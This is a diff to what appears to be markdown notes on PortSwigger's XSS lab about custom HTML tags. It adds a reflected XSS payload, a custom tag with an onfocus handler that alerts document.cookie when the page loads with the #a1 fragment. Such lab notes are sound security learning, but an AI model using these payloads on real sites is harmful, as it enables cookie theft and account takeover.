@@ -97,6 +97,7 @@ https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-cont
 ```tabindex="1"```, ```id="a1"```, ```#a1```
 ```
 <custom-tag tabindex="1" onfocus='alert(1337)' id="a1">#a1
+<xss id=a1 onfocus=alert(document.cookie) tabindex=1>#a1
 ```
 ## Reflected XSS with some SVG markup allowed
 ```
